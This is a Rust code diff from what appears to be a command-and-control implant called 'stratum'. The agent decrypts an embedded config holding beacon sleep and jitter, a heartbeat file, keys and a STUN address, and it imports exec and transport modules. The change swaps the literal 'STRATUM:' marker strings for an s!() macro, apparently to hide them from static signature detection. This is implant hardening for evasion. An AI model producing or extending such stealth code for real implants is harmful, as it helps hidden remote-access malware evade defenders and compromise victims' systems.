@@ -15,7 +15,7 @@
 //! Config wire format (pipe-separated, 9 fields):
 //!   folder_path|input_file|output_file|heartbeat_file|base_sleep|jitter|pub_key_b64|stun_ip|session_key_hex
 
-use crate::{crypto, crypto_compat, exec, hw, sysinfo, transport};
+use crate::{s, crypto, crypto_compat, exec, hw, sysinfo, transport};
 use std::sync::Arc;
 
 const STUB_SECRET:      &str = env!("STRATUM_STUB_SECRET");
@@ -66,7 +66,8 @@ pub fn run() {
 fn try_bootstrap() -> Option<AgentCfg> {
     if cfg!(stratum_debug) { eprintln!("[stageless-enc] decrypting config with stub_secret"); }
     let plain  = crypto_compat::openssl_decrypt(STUB_SECRET, ENCRYPTED_CONFIG)?;
-    let data   = plain.strip_prefix("STRATUM:")?.to_string();
+    let pfx = s!("STRATUM:");
+    let data   = plain.strip_prefix(&pfx)?.to_string();
     let cfg    = parse_cfg(&data)?;
     if cfg!(stratum_debug) { eprintln!("[stageless-enc] config parsed OK, caching"); }
     cache_cfg(&data);
@@ -76,7 +77,8 @@ fn try_bootstrap() -> Option<AgentCfg> {
 fn try_blob() -> Option<AgentCfg> {
     if cfg!(stratum_debug) { eprintln!("[stageless-enc] reading blob: {}", BLOB_PATH); }
     let plain = hw::read_blob(BLOB_PATH, SALT)?;
-    let data  = plain.strip_prefix("STRATUM:")?.to_string();
+    let pfx = s!("STRATUM:");
+    let data  = plain.strip_prefix(&pfx)?.to_string();
     parse_cfg(&data)
 }
 
@@ -97,7 +99,7 @@ fn parse_cfg(data: &str) -> Option<AgentCfg> {
 }
 
 fn cache_cfg(data: &str) {
-    let payload = format!("STRATUM:{}", data);
+    let payload = format!("{}{}", s!("STRATUM:"), data);
     hw::write_blob(BLOB_PATH, payload.as_bytes(), SALT);
 }
 
